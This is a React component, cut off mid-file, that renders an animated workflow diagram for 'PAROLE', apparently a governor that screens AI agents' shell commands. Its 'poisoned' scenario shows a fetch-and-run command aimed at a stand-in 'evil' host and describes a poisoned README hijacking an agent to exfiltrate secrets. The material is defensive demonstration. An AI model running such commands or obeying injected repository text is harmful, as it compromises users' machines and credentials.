"use client";

/**
 * PAROLE Home Hero — Technical Workflow Visualization.
 *
 * Restrained, high-precision product diagram:
 * - AI Agent → PAROLE Governor → Tier 0 / Tier 1 / Tier 2, plus a separate
 *   pre-routing Hard Security Boundary.
 * - Inactive nodes and connectors recede into neutral graphite; semantic color
 *   (emerald, cyan, amber, red) is used strictly to communicate the active
 *   routing decision.
 * - Automatically cycles through all four scenarios (~3.4s each) when in view,
 *   pauses when the browser tab is hidden, and supports Pause/Resume, Replay,
 *   scenario switching, and `prefers-reduced-motion`.
 */

import {
  useCallback,
  useEffect,
  useRef,
  useState,
} from "react";
import { useReducedMotion } from "framer-motion";
import { Pause, Play, RotateCcw } from "lucide-react";
import { QUICK_TEST_PRESETS, TIER_DEFINITIONS } from "@/lib/constants";
import type { Tone } from "@/lib/types";

export type ScenarioKey = "routine" | "risk-score" | "network" | "poisoned";

export type HeadlineLens = "fatigue" | "trap";

type WorkflowPhase = "ingress" | "evaluate" | "route" | "arrive";

interface Point {
  x: number;
  y: number;
}

interface CubicBezier {
  p0: Point;
  p1: Point;
  p2: Point;
  p3: Point;
}

export interface ScenarioConfig {
  key: ScenarioKey;
  lens: HeadlineLens;
  label: string;
  commandLabel: string;
  commandFull: string;
  tone: Tone;
  hex: string;
  rgb: string;
  target: "tier0" | "tier1" | "tier2" | "boundary";
  routeName: string;
  outcomeStatus: "Allowed" | "Risk Scored & Allowed" | "Escalated" | "Blocked";
  governorState: string;
  decisionLabel: string;
  latencyLabel: string;
  withoutParole: string;
  consequence: string;
  explanation: string;
}

const gitStatusPreset =
  QUICK_TEST_PRESETS.find((p) => p.id === "git-status") ?? QUICK_TEST_PRESETS[0];
const rgTodoPreset =
  QUICK_TEST_PRESETS.find((p) => p.id === "rg-todo") ?? QUICK_TEST_PRESETS[3];
const curlUsersPreset =
  QUICK_TEST_PRESETS.find((p) => p.id === "curl-users") ?? QUICK_TEST_PRESETS[2];
const poisonPreset =
  QUICK_TEST_PRESETS.find((p) => p.id === "poisoned-readme") ??
  QUICK_TEST_PRESETS[4];

const tier0Def = TIER_DEFINITIONS.find((t) => t.id === 0)!;
const tier1Def = TIER_DEFINITIONS.find((t) => t.id === 1)!;
const tier2Def = TIER_DEFINITIONS.find((t) => t.id === 2)!;

export const SCENARIOS: Record<ScenarioKey, ScenarioConfig> = {
  routine: {
    key: "routine",
    lens: "fatigue",
    label: "Routine allow",
    commandLabel: "git status",
    commandFull: gitStatusPreset.command,
    tone: "safe",
    hex: "#10b981",
    rgb: "16 185 129",
    target: "tier0",
    routeName: "Tier 0 — PicoClaw",
    outcomeStatus: "Allowed",
    governorState: "Allowlist match → Tier 0",
    decisionLabel: "Tier 0 · Allow",
    latencyLabel: tier0Def.latencyLabel,
    withoutParole:
      "Repetitive approval prompts interrupt the AI agent on safe, routine commands.",
    consequence:
      "Developers start clicking “Approve” on reflex or enable blanket “Always Allow” mode just to keep coding.",
    explanation:
      "Familiar, allowlisted command resolves locally without model overhead or human prompts.",
  },
  "risk-score": {
    key: "risk-score",
    lens: "fatigue",
    label: "Risk score",
    commandLabel: 'rg "TODO" src/',
    commandFull: rgTodoPreset.command,
    tone: "tier1",
    hex: "#06b6d4",
    rgb: "6 182 212",
    target: "tier1",
    routeName: "Tier 1 — TypeSafe Jev",
    outcomeStatus: "Risk Scored & Allowed",
    governorState: "Unfamiliar scan → Tier 1",
    decisionLabel: "Tier 1 · Risk Score",
    latencyLabel: tier1Def.latencyLabel,
    withoutParole:
      "Every unfamiliar local scan forces another manual confirmation dialog, draining attention.",
    consequence:
      "Constant modal interruptions break developer flow and make high-risk prompts indistinguishable from benign scans.",
    explanation:
      "Unfamiliar repository scan receives a fast risk score automatically before execution.",
  },
  network: {
    key: "network",
    lens: "trap",
    label: "Escalate",
    commandLabel: "curl 10.0.4.12/api/v1/users",
    commandFull: curlUsersPreset.command,
    tone: "tier2",
    hex: "#f59e0b",
    rgb: "245 158 11",
    target: "tier2",
    routeName: "Tier 2 — Nebius Synthesis",
    outcomeStatus: "Escalated",
    governorState: "Internal network → Tier 2",
    decisionLabel: "Tier 2 · Escalate",
    latencyLabel: tier2Def.latencyLabel,
    withoutParole:
      "After dozens of routine prompts, an exhausted reviewer rubber-stamps a sensitive subnet call.",
    consequence:
      "Broad standing permissions expose internal services without synthesizing a least-privilege boundary.",
    explanation:
      "Sensitive internal network request escalates for deep policy synthesis before execution.",
  },
  poisoned: {
    key: "poisoned",
    lens: "trap",
    label: "Hard block",
    commandLabel: 'sh -c "$(curl -s evil/…)"',
    commandFull: poisonPreset.command,
    tone: "threat",
    hex: "#ef4444",
    rgb: "239 68 68",
    target: "boundary",
    routeName: "Hard Security Boundary",
    outcomeStatus: "Blocked",
    governorState: "Tainted input → Intercepted",
    decisionLabel: "Hard Boundary · Blocked",
    latencyLabel: poisonPreset.expectedLatencyLabel,
    withoutParole:
      "Broad standing permissions or reflex approvals let a poisoned README execute untrusted shell code.",
    consequence:
      "Untrusted repository content hijacks the agent's shell privileges to exfiltrate secrets or execute remote payloads.",
    explanation:
      "Poisoned README payload is blocked at the Hard Security Boundary before tier routing.",
  },
};

export const SCENARIO_SEQUENCE: readonly ScenarioKey[] = [
  "routine",
  "risk-score",
  "network",
  "poisoned",
] as const;

const SCENARIO_DURATION_MS = 3400;
const INGRESS_END_MS = 750;
const EVAL_END_MS = 1450;
const ROUTE_END_MS = 2200;

/**
 * 2D Technical Schematic Geometry (viewBox 720 × 284):
 * - AI Agent right port: (176, 108)
 * - PAROLE Governor left port: (252, 108), right port: (432, 108), bottom pre-routing port: (342, 152)
 * - Tier 0 left port: (504, 42)
 * - Tier 1 left port: (504, 108)
 * - Tier 2 left port: (504, 174)
 * - Hard Security Boundary left port (below dashed routing divider): (432, 246)
 */
const PATH_CURVES: Record<
  "ingress" | "tier0" | "tier1" | "tier2" | "boundary",
  CubicBezier
> = {
  ingress: {
    p0: { x: 176, y: 108 },
    p1: { x: 200, y: 108 },
    p2: { x: 228, y: 108 },
    p3: { x: 252, y: 108 },
  },
  tier0: {
    p0: { x: 432, y: 100 },
    p1: { x: 468, y: 100 },
    p2: { x: 468, y: 42 },
    p3: { x: 504, y: 42 },
  },
  tier1: {
    p0: { x: 432, y: 108 },
    p1: { x: 458, y: 108 },
    p2: { x: 478, y: 108 },
    p3: { x: 504, y: 108 },
  },
  tier2: {
    p0: { x: 432, y: 116 },
    p1: { x: 468, y: 116 },
    p2: { x: 468, y: 174 },
    p3: { x: 504, y: 174 },
  },
  boundary: {
    p0: { x: 342, y: 152 },
    p1: { x: 342, y: 230 },
    p2: { x: 374, y: 246 },
    p3: { x: 432, y: 246 },
  },
};

function bezierToSvgPath(c: CubicBezier): string {
  return `M ${c.p0.x} ${c.p0.y} C ${c.p1.x} ${c.p1.y}, ${c.p2.x} ${c.p2.y}, ${c.p3.x} ${c.p3.y}`;
}

function evalBezier(c: CubicBezier, t: number): Point {
  const u = Math.max(0, Math.min(1, t));
  const inv = 1 - u;
  const b0 = inv * inv * inv;
  const b1 = 3 * inv * inv * u;
  const b2 = 3 * inv * u * u;
  const b3 = u * u * u;
  return {
    x: b0 * c.p0.x + b1 * c.p1.x + b2 * c.p2.x + b3 * c.p3.x,
    y: b0 * c.p0.y + b1 * c.p1.y + b2 * c.p2.y + b3 * c.p3.y,
  };
}

function easeInOutCubic(t: number): number {
  const u = Math.max(0, Math.min(1, t));
  return u < 0.5 ? 4 * u * u * u : 1 - Math.pow(-2 * u + 2, 3) / 2;
}

const SVG_PATHS = {
  ingress: bezierToSvgPath(PATH_CURVES.ingress),
  tier0: bezierToSvgPath(PATH_CURVES.tier0),
  tier1: bezierToSvgPath(PATH_CURVES.tier1),
  tier2: bezierToSvgPath(PATH_CURVES.tier2),
  boundary: bezierToSvgPath(PATH_CURVES.boundary),
} as const;

export interface RoutingVisualProps {
  /** Callback fired whenever the active scenario changes (automatic or manual). */
  onScenarioChange?: (key: ScenarioKey) => void;
}

export function RoutingVisual({
  onScenarioChange,
}: RoutingVisualProps = {}) {
  const prefersReducedMotion = useReducedMotion();
  const containerRef = useRef<HTMLDivElement | null>(null);

  const [activeKey, setActiveKey] = useState<ScenarioKey>("routine");
  const [phase, setPhase] = useState<WorkflowPhase>("ingress");
  const [isPlaying, setIsPlaying] = useState<boolean>(true);
  const [isInViewport, setIsInViewport] = useState<boolean>(true);
  const [isTabVisible, setIsTabVisible] = useState<boolean>(true);
  const [manualStartInReducedMotion, setManualStartInReducedMotion] =
    useState<boolean>(false);

  // Mutable refs so React state updates never reset timers
  const rafRef = useRef<number | null>(null);
  const activeKeyRef = useRef<ScenarioKey>("routine");
  const phaseRef = useRef<WorkflowPhase>("ingress");
  const elapsedRef = useRef<number>(0);
  const lastFrameTimeRef = useRef<number | null>(null);

  // Imperative SVG refs for smooth 60fps indicator motion
  const indicatorDotRef = useRef<SVGCircleElement | null>(null);
  const indicatorRingRef = useRef<SVGCircleElement | null>(null);
  const progressBarRefs = useRef<Record<ScenarioKey, HTMLSpanElement | null>>({
    routine: null,
    "risk-score": null,
    network: null,
    poisoned: null,
  });

  const scenario = SCENARIOS[activeKey];
  const shouldAnimate =
    isPlaying &&
    isInViewport &&
    isTabVisible &&
    (!prefersReducedMotion || manualStartInReducedMotion);

  useEffect(() => {
    const el = containerRef.current;
    if (!el || typeof IntersectionObserver === "undefined") return;

    const observer = new IntersectionObserver(
      (entries) => {
        const entry = entries[0];
        if (entry) {
          setIsInViewport(entry.isIntersecting);
        }
      },
      { threshold: 0.15 },
    );

    observer.observe(el);
    return () => observer.disconnect();
  }, []);

  useEffect(() => {
    if (typeof document === "undefined") return;

    const handleVisibilityChange = () => {
      setIsTabVisible(document.visibilityState === "visible");
    };

    handleVisibilityChange();
    document.addEventListener("visibilitychange", handleVisibilityChange);
    return () => {
      document.removeEventListener("visibilitychange", handleVisibilityChange);
    };
  }, []);

  const applyFrameAtElapsed = useCallback(
    (elapsed: number, cfg: ScenarioConfig) => {
      const outCurve =
        cfg.target === "tier0"
          ? PATH_CURVES.tier0
          : cfg.target === "tier1"
            ? PATH_CURVES.tier1
            : cfg.target === "tier2"
              ? PATH_CURVES.tier2
              : PATH_CURVES.boundary;

      let nextPhase: WorkflowPhase = "ingress";
      let pos: Point = PATH_CURVES.ingress.p0;
      let showIndicator = true;

      if (elapsed < INGRESS_END_MS) {
        nextPhase = "ingress";
        const t = easeInOutCubic(elapsed / INGRESS_END_MS);
        pos = evalBezier(PATH_CURVES.ingress, t);
        showIndicator = true;
      } else if (elapsed < EVAL_END_MS) {
        nextPhase = "evaluate";
        pos = { x: 342, y: 108 };
        showIndicator = false;
      } else if (elapsed < ROUTE_END_MS) {
        nextPhase = "route";
        const t = easeInOutCubic(
          (elapsed - EVAL_END_MS) / (ROUTE_END_MS - EVAL_END_MS),
        );
        pos = evalBezier(outCurve, t);
        showIndicator = true;
      } else {
        nextPhase = "arrive";
        pos = outCurve.p3;
        showIndicator = true;
      }

      if (phaseRef.current !== nextPhase) {
        phaseRef.current = nextPhase;
        setPhase(nextPhase);
      }

      if (indicatorDotRef.current) {
        indicatorDotRef.current.setAttribute("cx", pos.x.toFixed(1));
        indicatorDotRef.current.setAttribute("cy", pos.y.toFixed(1));
        indicatorDotRef.current.setAttribute("fill", cfg.hex);
        indicatorDotRef.current.setAttribute(
          "opacity",
          showIndicator ? "1" : "0",
        );
      }
      if (indicatorRingRef.current) {
        indicatorRingRef.current.setAttribute("cx", pos.x.toFixed(1));
        indicatorRingRef.current.setAttribute("cy", pos.y.toFixed(1));
        indicatorRingRef.current.setAttribute("stroke", cfg.hex);
        indicatorRingRef.current.setAttribute(
          "opacity",
          showIndicator ? "0.4" : "0",
        );
      }

      const pct = Math.min(
        100,
        Math.max(0, (elapsed / SCENARIO_DURATION_MS) * 100),
      );
      for (const key of SCENARIO_SEQUENCE) {
        const bar = progressBarRefs.current[key];
        if (!bar) continue;
        bar.style.width = key === cfg.key ? `${pct.toFixed(1)}%` : "0%";
      }
    },
    [],
  );

  useEffect(() => {
    if (!shouldAnimate) {
      if (rafRef.current !== null) {
        cancelAnimationFrame(rafRef.current);
        rafRef.current = null;
      }
      lastFrameTimeRef.current = null;

      if (prefersReducedMotion && !manualStartInReducedMotion) {
        applyFrameAtElapsed(
          ROUTE_END_MS + 200,
          SCENARIOS[activeKeyRef.current],
        );
      }
      return;
    }

    lastFrameTimeRef.current = null;

    const tick = (now: number) => {
      const dt =
        lastFrameTimeRef.current === null
          ? 0
          : Math.min(now - lastFrameTimeRef.current, 100);
      lastFrameTimeRef.current = now;

      let nextElapsed = elapsedRef.current + dt;
      let currentKey = activeKeyRef.current;

      if (nextElapsed >= SCENARIO_DURATION_MS) {
        nextElapsed = nextElapsed % SCENARIO_DURATION_MS;
        const currentIdx = SCENARIO_SEQUENCE.indexOf(currentKey);
        currentKey =
          SCENARIO_SEQUENCE[(currentIdx + 1) % SCENARIO_SEQUENCE.length];
        activeKeyRef.current = currentKey;
        setActiveKey(currentKey);
      }

      elapsedRef.current = nextElapsed;
      applyFrameAtElapsed(nextElapsed, SCENARIOS[currentKey]);
      rafRef.current = requestAnimationFrame(tick);
    };

    rafRef.current = requestAnimationFrame(tick);

    return () => {
      if (rafRef.current !== null) {
        cancelAnimationFrame(rafRef.current);
        rafRef.current = null;
      }
      lastFrameTimeRef.current = null;
    };
  }, [
    shouldAnimate,
    prefersReducedMotion,
    manualStartInReducedMotion,
    applyFrameAtElapsed,
  ]);

  const handleSelectScenario = useCallback(
    (key: ScenarioKey) => {
      activeKeyRef.current = key;
      setActiveKey(key);
      elapsedRef.current = 0;
      lastFrameTimeRef.current = null;
      phaseRef.current = "ingress";
      setPhase("ingress");

      if (prefersReducedMotion && !manualStartInReducedMotion) {
        applyFrameAtElapsed(ROUTE_END_MS + 200, SCENARIOS[key]);
      } else {
        setIsPlaying(true);
        applyFrameAtElapsed(0, SCENARIOS[key]);
      }
    },
    [prefersReducedMotion, manualStartInReducedMotion, applyFrameAtElapsed],
  );

  const handleSelectFromHeadline = useCallback(
    (key: ScenarioKey) => {
      activeKeyRef.current = key;
      setActiveKey(key);
      lastFrameTimeRef.current = null;
      elapsedRef.current = SCENARIO_DURATION_MS;
      phaseRef.current = "arrive";
      setPhase("arrive");
      setIsPlaying(false);
      applyFrameAtElapsed(SCENARIO_DURATION_MS, SCENARIOS[key]);
    },
    [applyFrameAtElapsed],
  );

  useEffect(() => {
    onScenarioChange?.(activeKey);
  }, [activeKey, onScenarioChange]);

  const handleTogglePlayPause = useCallback(() => {
    if (prefersReducedMotion && !manualStartInReducedMotion) {
      setManualStartInReducedMotion(true);
      elapsedRef.current = 0;
      lastFrameTimeRef.current = null;
      setIsPlaying(true);
      return;
    }
    setIsPlaying((prev) => {
      if (!prev && elapsedRef.current >= SCENARIO_DURATION_MS) {
        elapsedRef.current = 0;
        lastFrameTimeRef.current = null;
      }
      return !prev;
    });
  }, [prefersReducedMotion, manualStartInReducedMotion]);

  const handleReplay = useCallback(() => {
    if (prefersReducedMotion && !manualStartInReducedMotion) {
      setManualStartInReducedMotion(true);
    }
    const currentKey = activeKeyRef.current;
    elapsedRef.current = 0;
    lastFrameTimeRef.current = null;
    phaseRef.current = "ingress";
    setPhase("ingress");
    setIsPlaying(true);
    applyFrameAtElapsed(0, SCENARIOS[currentKey]);
  }, [prefersReducedMotion, manualStartInReducedMotion, applyFrameAtElapsed]);

  const isBoundaryScenario = scenario.target === "boundary";
  const isGovernorActive = phase !== "ingress";
  const isOutcomeArrived = phase === "arrive";

  return (
    <div
      ref={containerRef}
      className="overflow-hidden rounded-lg border border-white/[0.08] bg-[#0d0d10]"
    >
      {/* Top Bar: Quiet Simulation Label + Pause/Replay Controls */}
      <div className="flex items-center justify-between gap-2 border-b border-white/[0.06] px-4 py-2.5">
        <div className="flex items-center gap-2 text-xs text-ink-dim">
          <span
            aria-hidden="true"
            className="h-1.5 w-1.5 rounded-full transition-colors duration-200"
            style={{ backgroundColor: scenario.hex }}
          />
          <span className="font-medium text-ink">Workflow simulation</span>
          <span className="text-ink-faint">· Simulated demo</span>
        </div>

        <div
          role="group"
          aria-label="Simulation playback controls"
          className="flex items-center gap-1"
        >
          <button
            type="button"
            onClick={handleTogglePlayPause}
            aria-pressed={shouldAnimate}
            aria-label={
              shouldAnimate ? "Pause simulation" : "Resume simulation"
            }
            className="press inline-flex h-7 cursor-pointer items-center gap-1.5 rounded px-2 text-xs text-ink-dim transition-colors hover:bg-white/[0.05] hover:text-ink"
          >
            {shouldAnimate ? (
              <>
                <Pause className="h-3 w-3" aria-hidden="true" />
                <span>Pause</span>
              </>
            ) : (
              <>
                <Play className="h-3 w-3" aria-hidden="true" />
                <span>Resume</span>
              </>
            )}
          </button>

          <button
            type="button"
            onClick={handleReplay}
            aria-label="Replay current scenario"
            className="press inline-flex h-7 cursor-pointer items-center gap-1.5 rounded px-2 text-xs text-ink-dim transition-colors hover:bg-white/[0.05] hover:text-ink"
          >
            <RotateCcw className="h-3 w-3" aria-hidden="true" />
            <span>Replay</span>
          </button>
        </div>
      </div>

      {/* Technical Schematic Stage */}
      <div
        role="img"
        aria-label={`PAROLE workflow diagram: AI Agent submits ${scenario.commandLabel}, PAROLE Governor evaluates policy, resulting in ${scenario.decisionLabel} (${scenario.latencyLabel}). ${scenario.explanation}`}
        className="relative h-[284px] w-full bg-[#0a0a0d]"
      >
        {/* Thin, Quiet Technical Connectors & Moving Command Indicator */}
        <svg
          viewBox="0 0 720 284"
          preserveAspectRatio="none"
          className="pointer-events-none absolute inset-0 h-full w-full"
          fill="none"
        >
          {/* Dashed horizontal boundary separator between routing tiers and pre-routing block */}
          <line
            x1="252"
            y1="212"
            x2="704"
            y2="212"
            stroke="rgb(255 255 255 / 0.05)"
            strokeWidth="1"
            strokeDasharray="3 3"
          />

          {/* Base quiet connector tracks */}
          <path
            d={SVG_PATHS.ingress}
            stroke="rgb(255 255 255 / 0.1)"
            strokeWidth="1.25"
          />
          <path
            d={SVG_PATHS.tier0}
            stroke="rgb(255 255 255 / 0.08)"
            strokeWidth="1.25"
          />
          <path
            d={SVG_PATHS.tier1}
            stroke="rgb(255 255 255 / 0.08)"
            strokeWidth="1.25"
          />
          <path
            d={SVG_PATHS.tier2}
            stroke="rgb(255 255 255 / 0.08)"
            strokeWidth="1.25"
          />
          <path
            d={SVG_PATHS.boundary}
            stroke="rgb(255 255 255 / 0.08)"
            strokeWidth="1.25"
            strokeDasharray="4 3"
          />

          {/* Active route highlight — only the current path receives semantic color */}
          <path
            d={SVG_PATHS.ingress}
            stroke={scenario.hex}
            strokeWidth="1.5"
            strokeOpacity={
              phase === "ingress"
                ? "0.85"
                : phase === "evaluate"
                  ? "0.45"
                  : "0.2"
            }
          />
          <path
            d={
              scenario.target === "tier0"
                ? SVG_PATHS.tier0
                : scenario.target === "tier1"
                  ? SVG_PATHS.tier1
                  : scenario.target === "tier2"
                    ? SVG_PATHS.tier2
                    : SVG_PATHS.boundary
            }
            stroke={scenario.hex}
            strokeWidth="1.5"
            strokeDasharray={isBoundaryScenario ? "4 3" : undefined}
            strokeOpacity={
              phase === "route" || phase === "arrive"
                ? "0.9"
                : phase === "evaluate"
                  ? "0.4"
                  : "0.15"
            }
          />

          {/* Small directional arrowheads */}
          <polygon
            points="252,108 246,105 246,111"
            fill={
              phase === "ingress" ? scenario.hex : "rgb(255 255 255 / 0.22)"
            }
          />
          <polygon
            points="504,42 498,39 498,45"
            fill={
              scenario.target === "tier0" &&
              (phase === "route" || phase === "arrive")
                ? "#10b981"
                : "rgb(255 255 255 / 0.16)"
            }
          />
          <polygon
            points="504,108 498,105 498,111"
            fill={
              scenario.target === "tier1" &&
              (phase === "route" || phase === "arrive")
                ? "#06b6d4"
                : "rgb(255 255 255 / 0.16)"
            }
          />
          <polygon
            points="504,174 498,171 498,177"
            fill={
              scenario.target === "tier2" &&
              (phase === "route" || phase === "arrive")
                ? "#f59e0b"
                : "rgb(255 255 255 / 0.16)"
            }
          />
          {/* Pre-routing boundary stop bar */}
          <line
            x1="432"
            y1="238"
            x2="432"
            y2="254"
            stroke={isBoundaryScenario ? "#ef4444" : "rgb(255 255 255 / 0.2)"}
            strokeWidth="1.75"
          />

          {/* Travelling Command Indicator */}
          <circle
            ref={indicatorRingRef}
            cx="176"
            cy="108"
            r="6.5"
            fill="none"
            stroke={scenario.hex}
            strokeWidth="1"
            opacity="0.4"
          />
          <circle
            ref={indicatorDotRef}
            cx="176"
            cy="108"
            r="3.25"
            fill={scenario.hex}
          />
        </svg>

        {/* 1. LEFT: AI Agent Node */}
        <div
          className="absolute top-[108px] left-[2.2%] w-[22.2%] -translate-y-1/2 rounded-md border bg-[#111115] p-3 transition-colors duration-200"
          style={{
            borderColor:
              phase === "ingress"
                ? "rgb(255 255 255 / 0.2)"
                : "rgb(255 255 255 / 0.07)",
          }}
        >
          <div className="flex items-center justify-between gap-1">
            <span className="text-xs font-medium text-ink">AI Agent</span>
            <span className="font-mono text-[10px] text-ink-faint">input</span>
          </div>
          <div className="mt-2 truncate rounded bg-[#09090b] px-2 py-1.5 font-mono text-[11px] text-ink">
            <span className="text-ink-faint select-none">$ </span>
            {scenario.commandLabel}
          </div>
        </div>

        {/* 2. CENTER: PAROLE Governor Node */}
        <div
          className="absolute top-[108px] left-[35%] w-[25%] -translate-y-1/2 rounded-md border bg-[#131318] p-3 transition-colors duration-200"
          style={{
            borderColor: isGovernorActive
              ? `rgb(${scenario.rgb} / 0.55)`
              : "rgb(255 255 255 / 0.1)",
          }}
        >
          <div className="flex items-center justify-between gap-1.5">
            <span className="text-xs font-semibold text-ink">
              PAROLE Governor
            </span>
            <span
              aria-hidden="true"
              className="h-1.5 w-1.5 rounded-full transition-colors duration-200"
              style={{
                backgroundColor: isGovernorActive
                  ? scenario.hex
                  : "rgb(113 113 122 / 0.5)",
              }}
            />
          </div>
          <p className="mt-0.5 text-[11px] text-ink-faint">
            Policy &amp; taint evaluation
          </p>
          <div className="mt-2 truncate rounded bg-[#0a0a0d] px-2 py-1 font-mono text-[10px] transition-colors duration-200">
            <span
              style={{
                color:
                  phase === "ingress" ? "rgb(113 113 122)" : scenario.hex,
              }}
            >
              {phase === "ingress"
                ? "Receiving command…"
                : scenario.governorState}
            </span>
          </div>
        </div>

        {/* 3. RIGHT: Three Routing Tiers (Inactive tiers recede; active decision stands out) */}
        {/* Tier 0 */}
        <button
          type="button"
          onClick={() => handleSelectScenario("routine")}
          aria-pressed={activeKey === "routine"}
          className="absolute top-[42px] right-[2.2%] flex w-[27.8%] -translate-y-1/2 cursor-pointer items-center justify-between gap-2 rounded-md border bg-[#111115] px-3 py-2 text-left transition-colors duration-200 hover:border-white/[0.16]"
          style={{
            borderColor:
              scenario.target === "tier0" && isOutcomeArrived
                ? "rgb(16 185 129 / 0.6)"
                : scenario.target === "tier0"
                  ? "rgb(255 255 255 / 0.14)"
                  : "rgb(255 255 255 / 0.06)",
            backgroundColor:
              scenario.target === "tier0" && isOutcomeArrived
                ? "rgb(16 185 129 / 0.08)"
                : "#111115",
          }}
        >
          <span className="flex min-w-0 items-center gap-2">
            <span
              aria-hidden="true"
              className="h-1.5 w-1.5 shrink-0 rounded-full transition-colors duration-200"
              style={{
                backgroundColor:
                  scenario.target === "tier0"
                    ? "#10b981"
                    : "rgb(113 113 122 / 0.4)",
              }}
            />
            <span
              className={[
                "truncate text-xs font-medium transition-colors duration-200",
                scenario.target === "tier0" ? "text-ink" : "text-ink-faint",
              ].join(" ")}
            >
              Tier 0 · Allow
            </span>
          </span>
          <span className="shrink-0 font-mono text-[10px] text-ink-faint">
            &lt;2ms
          </span>
        </button>

        {/* Tier 1 */}
        <button
          type="button"
          onClick={() => handleSelectScenario("risk-score")}
          aria-pressed={activeKey === "risk-score"}
          className="absolute top-[108px] right-[2.2%] flex w-[27.8%] -translate-y-1/2 cursor-pointer items-center justify-between gap-2 rounded-md border bg-[#111115] px-3 py-2 text-left transition-colors duration-200 hover:border-white/[0.16]"
          style={{
            borderColor:
              scenario.target === "tier1" && isOutcomeArrived
                ? "rgb(6 182 212 / 0.6)"
                : scenario.target === "tier1"
                  ? "rgb(255 255 255 / 0.14)"
                  : "rgb(255 255 255 / 0.06)",
            backgroundColor:
              scenario.target === "tier1" && isOutcomeArrived
                ? "rgb(6 182 212 / 0.08)"
                : "#111115",
          }}
        >
          <span className="flex min-w-0 items-center gap-2">
            <span
              aria-hidden="true"
              className="h-1.5 w-1.5 shrink-0 rounded-full transition-colors duration-200"
              style={{
                backgroundColor:
                  scenario.target === "tier1"
                    ? "#06b6d4"
                    : "rgb(113 113 122 / 0.4)",
              }}
            />
            <span
              className={[
                "truncate text-xs font-medium transition-colors duration-200",
                scenario.target === "tier1" ? "text-ink" : "text-ink-faint",
              ].join(" ")}
            >
              Tier 1 · Risk Score
            </span>
          </span>
          <span className="shrink-0 font-mono text-[10px] text-ink-faint">
            95–100ms
          </span>
        </button>

        {/* Tier 2 */}
        <button
          type="button"
          onClick={() => handleSelectScenario("network")}
          aria-pressed={activeKey === "network"}
          className="absolute top-[174px] right-[2.2%] flex w-[27.8%] -translate-y-1/2 cursor-pointer items-center justify-between gap-2 rounded-md border bg-[#111115] px-3 py-2 text-left transition-colors duration-200 hover:border-white/[0.16]"
          style={{
            borderColor:
              scenario.target === "tier2" && isOutcomeArrived
                ? "rgb(245 158 11 / 0.6)"
                : scenario.target === "tier2"
                  ? "rgb(255 255 255 / 0.14)"
                  : "rgb(255 255 255 / 0.06)",
            backgroundColor:
              scenario.target === "tier2" && isOutcomeArrived
                ? "rgb(245 158 11 / 0.08)"
                : "#111115",
          }}
        >
          <span className="flex min-w-0 items-center gap-2">
            <span
              aria-hidden="true"
              className="h-1.5 w-1.5 shrink-0 rounded-full transition-colors duration-200"
              style={{
                backgroundColor:
                  scenario.target === "tier2"
                    ? "#f59e0b"
                    : "rgb(113 113 122 / 0.4)",
              }}
            />
            <span
              className={[
                "truncate text-xs font-medium transition-colors duration-200",
                scenario.target === "tier2" ? "text-ink" : "text-ink-faint",
              ].join(" ")}
            >
              Tier 2 · Escalate
            </span>
          </span>
          <span className="shrink-0 font-mono text-[10px] text-ink-faint">
            1.5–3s
          </span>
        </button>

        {/* 4. PRE-ROUTING HARD SECURITY BOUNDARY (Below dashed divider) */}
        <button
          type="button"
          onClick={() => handleSelectScenario("poisoned")}
          aria-pressed={activeKey === "poisoned"}
          className="absolute top-[246px] right-[2.2%] flex w-[37.5%] -translate-y-1/2 cursor-pointer items-center justify-between gap-2 rounded-md border bg-[#111115] px-3 py-2 text-left transition-colors duration-200 hover:border-white/[0.16]"
          style={{
            borderColor:
              isBoundaryScenario && isOutcomeArrived
                ? "rgb(239 68 68 / 0.65)"
                : isBoundaryScenario
                  ? "rgb(255 255 255 / 0.14)"
                  : "rgb(255 255 255 / 0.06)",
            backgroundColor:
              isBoundaryScenario && isOutcomeArrived
                ? "rgb(239 68 68 / 0.09)"
                : "#111115",
          }}
        >
          <span className="flex min-w-0 items-center gap-2">
            <span
              aria-hidden="true"
              className="h-1.5 w-1.5 shrink-0 rounded-full transition-colors duration-200"
              style={{
                backgroundColor: isBoundaryScenario
                  ? "#ef4444"
                  : "rgb(113 113 122 / 0.4)",
              }}
            />
            <span
              className={[
                "truncate text-xs font-medium transition-colors duration-200",
                isBoundaryScenario ? "text-threat" : "text-ink-faint",
              ].join(" ")}
            >
              Hard Boundary · Blocked before tier routing
            </span>
          </span>
          <span className="shrink-0 font-mono text-[10px] text-ink-faint">
            0.3ms
          </span>
        </button>
      </div>

      {/* Hairline-Divided Scenario Selector Strip */}
      <div
        role="group"
        aria-label="Select a workflow scenario"
        className="grid grid-cols-2 divide-x divide-y divide-white/[0.06] border-t border-white/[0.06] bg-[#0d0d10] sm:grid-cols-4 sm:divide-y-0"
      >
        {SCENARIO_SEQUENCE.map((key) => {
          const item = SCENARIOS[key];
          const isSelected = activeKey === key;
          return (
            <button
              key={key}
              type="button"
              onClick={() => handleSelectScenario(key)}
              aria-pressed={isSelected}
              className={[
                "relative flex cursor-pointer flex-col gap-0.5 px-3 py-2.5 text-left transition-colors",
                isSelected
                  ? "bg-white/[0.03]"
                  : "hover:bg-white/[0.015]",
              ].join(" ")}
            >
              <span
                className={[
                  "text-[11px] font-medium transition-colors",
                  isSelected ? "text-ink" : "text-ink-faint",
                ].join(" ")}
              >
                {item.label}
              </span>
              <code
                className={[
                  "truncate font-mono text-[11px] transition-colors",
                  isSelected ? "text-ink-dim" : "text-ink-faint/70",
                ].join(" ")}
              >
                {item.commandLabel}
              </code>

              {/* Subtle 1.5px bottom progress line */}
              <span
                aria-hidden="true"
                className="pointer-events-none absolute right-0 bottom-0 left-0 h-[1.5px] bg-transparent"
              >
                <span
                  ref={(el) => {
                    progressBarRefs.current[key] = el;
                  }}
                  className="block h-full"
                  style={{
                    width: isSelected ? "100%" : "0%",
                    backgroundColor: item.hex,
                  }}
                />
              </span>
            </button>
          );
        })}
      </div>

      {/* Single Quiet Outcome Readout Bar */}
      <div
        role="status"
        aria-live="polite"
        className="flex flex-col gap-1.5 border-t border-white/[0.06] bg-[#0b0b0e] px-4 py-2.5"
      >
        <div className="flex flex-wrap items-center justify-between gap-2 text-xs">
          <div className="flex flex-wrap items-center gap-2">
            <span
              className="font-mono font-medium"
              style={{ color: scenario.hex }}
            >
              {scenario.routeName} · {scenario.outcomeStatus}
            </span>
            <span className="font-mono text-ink-faint">
              · {scenario.latencyLabel}
            </span>
          </div>

          <span className="font-mono text-[11px] text-ink-faint">
            Stage:{" "}
            <span className="text-ink-dim">
              {phase === "ingress"
                ? "1/4 AI Agent submits"
                : phase === "evaluate"
                  ? "2/4 Governor evaluates"
